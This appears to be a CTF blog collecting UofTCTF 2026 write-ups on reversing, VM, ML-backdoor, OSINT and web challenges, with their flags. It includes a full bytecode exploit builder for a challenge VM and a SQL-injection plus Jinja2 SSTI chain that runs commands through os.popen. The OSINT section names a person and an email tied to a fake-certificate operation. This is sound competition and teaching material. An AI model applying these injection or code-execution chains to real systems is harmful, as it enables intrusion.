---
title: "UofTCTF 2026"
published: 2026-02-10
description: "A curated collection of my UofTCTF 2026 writeups and technical notes."
tags: ["ctf", "uoftctf", "reverse", "misc", "osint"]
category: "UofTCTF"
draft: false
---

# UofTCTF 2026

> "In the world of binary and obfuscation, the truth is often hidden in plain sight. These are the chronicles of my journey through UofTCTF, where every line of code tells a story and every solved enigma is a step forward in the digital abyss."


A comprehensive collection of my solutions and technical insights from the UofTCTF event.


## 🛠️ Baby (Obfuscated) Flag Checker

---



### Summary
The challenge provides a heavily obfuscated Python script that asks for a flag and prints success/failure. Instead of fully deobfuscating, I used runtime tracing to capture the expected flag chunks when the program compares slices of the input against embedded strings. Stitching those chunks together yields the full flag.

### Key Observations
- The checker compares `g0go[...]` slices against known strings via a function `g0G0SQuid`.
- Those known strings are produced inside nested functions and can be captured at runtime.
- The script is deterministic; tracing specific line numbers is enough to extract each expected segment.

### Approach
1. Run the script once to confirm it is a Python checker with input prompt.
2. Locate the slice comparisons by searching for `g0G0SQuid(...) == g0G0SQuid(...)`.
3. Use `sys.settrace` to catch the lines where the comparisons happen and read the locals:
   - Slice start/end indexes.
   - The expected segment string.
4. Iterate until all segments are captured and reconstruct the flag.
5. Validate by running `baby.py` with the reconstructed flag.

### Commands
- Find the comparison sites:
```
rg -n "g0G0SQuid" "rev/Baby (Obfuscated) Flag Checker/baby.py"
```

- Run the checker:
```
python3 "rev/Baby (Obfuscated) Flag Checker/baby.py"
```

- Tracing script (conceptual outline):
```
- Import baby.py as a module
- Patch input() to return a 74-char placeholder
- settrace to capture locals at comparison lines
- Collect (start, end, expected_segment)
- Build flag and re-run to verify
```

### Result
Flag:
```
uoftctf{d1d_y0u_m0nk3Y_p4TcH_d3BuG_r3v_0r_0n3_sh07_th15_w17h_4n_1LM_XD???}
```

### Notes
- The `?` characters are literal and required for the check to pass.
- This method avoids full deobfuscation and scales to similar obfuscated checkers.


---


## 🛠️ Bring Your Own Program

---



### Goal
Craft a program for the custom VM that reads `/flag.txt` on the remote service and returns the real flag.

Key output:
- Dockerfile copies real flag to `/flag.txt` inside the container.

### VM format (from `chal.js`)
Input is a hex string parsed into bytes.

Header + constants + code:
- `nr` (1 byte): number of registers (1..64)
- `nc` (1 byte): number of constants
- Each constant:
  - `type` (1 byte)
  - If `type == 1`: float64 (8 bytes)
  - If `type == 2`: string length (u16 LE) + bytes
- Remaining bytes are `code`

Notable opcodes (byte values):
- `0x01` (a): `rX = const[Y]`
- `0x02` (b): `rX = caps[const[Y]]` (string name lookup)
- `0x20` (c): `rX = obj[key]`
- `0x21` (d): resolve capability function by key
- `0x30` (e): call function
- `0x31` (f): return
- `0x60` (h): relative jump (signed 16-bit)

Capabilities:
- Key `0` -> `F0` : read **absolute** file path
- Key `0x0a` -> `F1` : read under `/data/public` only

### Bug / bypass
Validation (`U(...)`) walks the bytecode linearly and checks opcodes and operands, but it **does not** follow jumps.
This allows jumping into the middle of a valid instruction so that its *operand bytes* are executed as opcodes (which were never validated).

We use a valid `op e` instruction as a “carrier” and jump into its operands to execute a hidden opcode sequence that uses key `0` (absolute file read), which is otherwise rejected by validation.

### Exploit program
Constants:
- `"caps"`
- `"/flag.txt"`

High-level execution:
1) Load `caps` into a register, then access index `3` to get the `caps` table.
2) Jump into the operands of a carrier `op e`.
3) Execute hidden opcodes:
   - `op d` -> fetch capability key `0` (absolute read)
   - `op a` -> load `/flag.txt`
   - `op e` -> call read function
   - `op f` -> return the file contents

### Builder script
```python
from binascii import hexlify

def build():
    consts = [b"caps", b"/flag.txt"]
    const_bytes = bytearray()
    for s in consts:
        const_bytes.append(2)
        const_bytes += len(s).to_bytes(2,'little')
        const_bytes += s

    code = bytearray()
    code += bytes([0x02, 0x00, 0x00])                # op b: r0 = caps
    code += bytes([0x20, 0x01, 0x00, 0x03])          # op c: r1 = r0[3]
    code += bytes([0x60, 0x05, 0x00])                # op h: jump +5 into payload

    # carrier1 op e (argc=8); payload starts at arg0
    code += bytes([0x30, 0x00, 0x00, 0x00, 0x08,
                   0x21, 0x00, 0x01, 0x01, 0x00, 0x01, 0x02, 0x01])

    # carrier2 / payload: op e (argc=1)
    code += bytes([0x30, 0x03, 0x00, 0x01, 0x01, 0x02])

    # payload end: op f
    code += bytes([0x31, 0x03])

    data = bytearray([64, len(consts)]) + const_bytes + code
    return data

b = build()
print(hexlify(b).decode())
```

Generated hex program:
```
4002020400636170730209002f666c61672e74787402000020010003600500300000000821000101000102013003000101023103
```

### Run (how to)
```bash
printf '%s\n' "4002020400636170730209002f666c61672e74787402000020010003600500300000000821000101000102013003000101023103" | nc 35.245.96.82 5000
```

### Result
```
uoftctf{c4ch3_m3_1n11n3_h0w_80u7_d4h??}
```


---


## 🛠️ ML Connoisseur

---



### Summary
The model is a digit classifier with a hidden “reference‑match” branch. If the input’s intermediate feature map matches an embedded reference tensor, the model’s output flips away from the digit label. By optimizing an image to match that reference, the backdoor fires and the rendered image itself contains the flag text.

### Key Observations
- `chal.py` preprocesses to RGB, resizes to 256×256, normalizes to `[0,1]`, permutes to CHW, then feeds the torch model.
- The main head is a 10‑class CNN for digits, but the forward pass also computes a feature map `G0gosqu1d(x)` and compares it to a stored reference buffer.
- If `MSE(G0gosqu1d(x), ref) < ~1e-3`, a backdoor branch is taken; the final output is no longer the digit argmax and the crafted image holds the real flag text.

### Verification (local)
1) Normal path: `examples/0.png` → 0, …, `examples/9.png` → 9.  
2) Backdoor: start from random noise, optimize `x` with Adam to minimize `MSE(G0gosqu1d(x), ref)`. Clamp `x` to `[0,1]`; stop once loss < 1e‑3.  
3) The optimized image (`optimized.png`) visually shows a plush toy with overlaid text `uoftctf{m0d3l_1nv3R510N}`, revealing the flag.

### Flag
```
uoftctf{m0d3l_1nv3R510N}
```


---


## 🛠️ My Shikishi is Fake! — OSINT

---

### My Shikishi is Fake! — OSINT

Goal: Find a long-running “high-quality fake shikishi certificate” operation and build the flag:

`uoftctf{JPNAME_EMAIL_YEAR_CERT}`

The challenge asks for 4 items:

1. The appraiser’s **first and last name in Japanese** (exactly as shown on the certificate).
2. An **email address** tied to one of the organizations that issued the certificate.
3. The **year** they were “reborn” and started expanding their activities.
4. PSA authenticated one of these fakes (a Draken & Mikey / Ken Wakui-related shikishi). Find the **PSA certification number**.

---

### 1) Identify the fake certificate system + the constant appraiser name

#### OSINT idea

The challenge says the organization names change over time, across sellers and platforms, but **the appraiser name stays the same**.
So the first priority is to find **certificate samples (COA templates)** shown in listings or posts and read the appraiser name directly from the certificate.

#### What I did

I searched using Japanese/English keywords like:

* “shikishi certificate sample”
* “色紙 鑑定書 見本”
* “国際 美術 鑑定 研究所 色紙”

These searches lead to pages/images showing the “certificate sample” used with shikishi autographs. The same appraiser name appeared on these certificates:

✅ **大山弘之**

Important: The challenge requires the name **in Japanese exactly as written on the certificate**, so I copied it in that exact form.

---

### 2) Find the issuing organization’s email address

#### OSINT idea

The prompt asks for an email “tied to one of the organizations the certificate is issued by.”
That means the email must belong to the **certificate/issuing organization**, not a community warning site or unrelated collector resource.

#### What I did

From the organization name printed/claimed on the certificate (e.g., related “international art appraisal/authentication” style names), I followed the trail to the organization’s contact information and extracted the email.

✅ Email found: **information@sony.main.jp**

Common pitfall: It’s easy to accidentally use an email from an *exposure / warning / discussion* site (like ShikishiBase), but that is **not** the issuing organization of the certificate and will produce a wrong flag.

---

### 3) Determine the “reborn / expanded activities” year

#### OSINT idea

This phrase usually refers to a specific change such as:

* New branding or a “restart”
* Expanding into more categories
* Introducing anti-counterfeit features like holograms / serial numbers

#### What I did

I examined the fine print on certificate sample images and related descriptions. These often mention when certain “systems” started (e.g., hologram + serial implementation).

✅ Year identified: **2015**

This matches the point where the operation “restarted” or upgraded its process (commonly described as the expansion phase).

---

### 4) PSA “oopsie” — find the certification number for the authenticated fake

#### OSINT idea

The prompt explicitly says a foreign collector bought one and posted it.
So the fastest route is social media OSINT (Instagram / Reddit / X), looking for a post that includes:

* PSA LOA (Letter of Authenticity)
* A PSA verification link
* A visible cert number

#### What I did

I located an Instagram post by **vroryn_TCG** showing the PSA LOA / related documentation and a PSA verification page.

From the PSA verification result:

* Item: *Shikishi: SIGNER KEN WAKUI*
* Cert Number: **AN09181**

✅ PSA cert number: **AN09181**

---

### 5) Assemble the final flag

| Field  | Value                                                       |
| ------ | ----------------------------------------------------------- |
| JPNAME | 大山弘之                                                        |
| EMAIL  | information@sony.main.jp |
| YEAR   | 2015                                                        |
| CERT   | AN09181                                                     |

✅ **Final Flag:**
`uoftctf{大山弘之_information@sony.main.jp_2015_AN09181}`

---


---


## 🛠️ No Quotes 3

---



### Summary
This challenge is the final evolution of the "No Quotes" series, requiring SQL injection via backslash escape, a self-replicating SQL quine with SHA256 hash verification, and Server-Side Template Injection (SSTI) without using quotes or periods for remote code execution.

### Challenge Evolution

| Challenge | Verification | Technique Required |
|-----------|--------------|-------------------|
| No Quotes 1 | None | SQL Injection + SSTI |
| No Quotes 2 | Row matching | SQL Quine (self-replicating query) |
| No Quotes 3 | Row + SHA256 hash | SQL Quine with hash verification + Period-free SSTI |


### Complete Attack Chain

```
1. Build SSTI payload
   └─> Extract characters from lipsum|string and request|string
   └─> Construct attribute names: __globals__, __getitem__, os, popen, read
   └─> Use |attr filter to avoid periods
   └─> Result: 1101 character payload without quotes or periods

2. Build SQL Quine
   └─> Username: SSTI_payload + \
   └─> Password: SQL quine template with SHA2()
   └─> Verify: SHA256(password) matches what MySQL will produce

3. Exploit
   └─> POST /login with crafted credentials
   └─> SQL injection succeeds
   └─> Hash verification passes (quine property)
   └─> Session stores SSTI payload as username
   └─> /home renders template with SSTI
   └─> Command executes: /readflag
   └─> Flag returned in response
```

### Technical Details

#### SQL Quine Internals

**Template:**
```sql
) UNION SELECT 0x<user_hex>, SHA2(REPLACE(0x$, CHAR(36), LOWER(HEX(0x$))), 256) --
```

**Execution Flow:**
1. MySQL parses: `REPLACE(0x$, CHAR(36), LOWER(HEX(0x$)))`
2. `0x$` contains the template in hex with `$` as placeholder (CHAR(36))
3. `HEX(0x$)` produces the uppercase hex encoding
4. `LOWER(HEX(0x$))` converts to lowercase (matching Python's hex output)
5. `REPLACE` substitutes `$` with the hex string
6. Result is exactly the password we sent
7. `SHA2(..., 256)` hashes it to match Python's verification

**Why it works:**
```python

password = template.replace('$', template.encode().hex())
expected_hash = hashlib.sha256(password.encode()).hexdigest()


result = REPLACE(template_hex, '$', LOWER(HEX(template_hex)))
actual_hash = SHA2(result, 256)





```

#### Character Extraction Sources

**lipsum|string:**
```
<function generate_lorem_ipsum at 0x784a96babd80>
```
Provides: `<`, `f`, `u`, `n`, `c`, `t`, `i`, `o`, `g`, `e`, `r`, `a`, `l`, `_`, `m`, `p`, `s`, `x`, `7`, `4`, `6`, `b`, `d`, `8`, `0`, `>`

**request|string:**
```
<Request 'http://no-quotes-3-069c0da32bc4052a.chals.uoftctf.org/home' [GET]>
```
Provides: `/`, `:`, `-`, `[`, `]`, and digits

**Combined:** Sufficient to build all required strings (`__globals__`, `os`, `popen`, etc.)

#### Jinja2 Filter Chain

```python

{{lipsum.__globals__['os'].popen('/readflag').read()}}


{{lipsum|attr('__globals__')}}


{{lipsum|attr(BUILD_STRING('__globals__'))}}


{{((((lipsum|attr(GLOBALS))|attr(GETITEM)(OS))|attr(POPEN)(CMD))|attr(READ)())}}
```

### Why "Recursion Theorem Moment"?

The flag `uoftctf{r3cuR510n_7h30R3M_m0M3n7}` references **Kleene's Recursion Theorem** in computability theory, which proves that programs can access their own source code. A SQL quine is a practical application of this theorem - the query produces its own source, enabling self-verification through hashing.

### Flag
```
uoftctf{r3cuR510n_7h30R3M_m0M3n7}
```

### Key Takeaways

1. **SQL Quines**: Self-replicating queries can bypass hash verification by producing their own hash
2. **Character Extraction**: When special characters are blocked, build them from available sources
3. **Jinja2 Filters**: The `|attr` filter provides attribute access without periods
4. **Defense in Depth**: Multiple vulnerabilities (SQLi + SSTI) create powerful attack chains
5. **Parametric Thinking**: Understanding mathematical properties (like quines) enables creative bypasses

### References

- [SQL Quine Technique - shysecurity.com](https://www.shysecurity.com/post/20140705-SQLi-Quine)
- [DUCTF sqli2022 writeup - justinsteven.com](https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/)
- [Kleene's Recursion Theorem - Wikipedia](https://en.wikipedia.org/wiki/Kleene%27s_recursion_theorem)
- [Jinja2 Template Designer Documentation](https://jinja.palletsprojects.com/en/3.0.x/templates/)


---


## 🛠️ Symbol of Hope

---



### Summary
Recovered the input by emulating each `f_*` transform in isolation, building per-function inverse mappings, and applying them in reverse order to the embedded `expected` bytes. Verified by running the checker.

### Given
- `rev/Symbol of Hope/checker` (UPX-packed ELF)
- `rev/Symbol of Hope/question.txt`
- Flag format: `uoftctf{...}`

### Key Observations
- After unpacking, `main` reads a 0x2a-byte line, copies it, and passes it to `f_0`.
- The chain `f_0 -> f_1 -> ... -> f_4199 -> f_4200` applies 4200 byte-wise transforms.
- `f_4200` compares the transformed buffer against `expected` in `.rodata`.

### Steps
1) Unpack the binary:
```
cp "rev/Symbol of Hope/checker" "rev/Symbol of Hope/checker.upx"
upx -d "rev/Symbol of Hope/checker.upx"
chmod +x "rev/Symbol of Hope/checker.upx"
```

2) Emulate and invert transforms:
- Script: `rev/Symbol of Hope/solve/recover_input_emulate.py`
- Idea:
  - Map the ELF in Unicorn.
  - Hook calls to `f_*` to avoid executing the whole chain while emulating a single function.
  - For each unique function body, build a 256-byte inverse mapping for the modified index.
  - Apply inverses in reverse order to `expected` to recover the original input.

Run:
```
python3 "rev/Symbol of Hope/solve/recover_input_emulate.py"
```

3) Verify:
```
printf '%s\n' 'uoftctf{5ymb0l1c_3x3cu710n_15_v3ry_u53ful}' | "./rev/Symbol of Hope/checker.upx"
```

### Flag
```
uoftctf{5ymb0l1c_3x3cu710n_15_v3ry_u53ful}
```


---


## 🛠️ Will u Accept Some Magic_

---



### Summary
The challenge provides a Kotlin/WASM binary with only `memory` and `_initialize` exports. I extracted the embedded UTF‑16 strings and then recovered the password by mapping validator “processor” objects in the WAT to their position checks and expected character constants. The resulting password passes the checker.

### Key Observations
- The module exports only `_initialize`, so the checker runs during init.
- Strings are stored in a big UTF‑16 data segment (`data 0`).
- Each validator “processor” is constructed via `struct.new 27` with function refs:
  - one function returns a constant ASCII value (the expected character),
  - one function checks the position (e.g., `pos == 7`, or `eqz` for position 0).
- By correlating these refs, you can reconstruct the full password without emulation.

### Steps
1. **Disassemble WASM → WAT**
   - Use `wasm-tools print` to generate `program.wat`.
2. **Extract strings**
   - Parse the `data 0` segment as UTF‑16LE; found prompts and validator names.
3. **Recover password**
   - Parse all `(global ... (ref 27) ... struct.new 27)` entries.
   - For each, grab:
     - the referenced type‑9 function `i32.const X` (expected char),
     - the referenced type‑19 function `pos == N` or `eqz` (position).
   - Build `password[pos] = char` and concatenate.
4. **Verify**
   - Run `runner.mjs` with the recovered password; it prints `Password: CORRECT!`.

### Commands

- Run the checker:
```
node "runner.mjs"
```

- (Conceptual) extraction outline:
```
- parse program.wat
- find all globals with "struct.new 27"
- map type9 funcs (i32.const) to char
- map type19 funcs (pos==N or eqz) to position
- assemble password in order
```

### Result
Password:
```
0QGFCBREENDFDONZRC39BDS3DMEH3E
```

Flag:
```
uoftctf{0QGFCBREENDFDONZRC39BDS3DMEH3E}
```

### Notes
- This approach avoids full decompilation and relies on the validator object layout.
- The password length is 30 (positions 0–29).


---
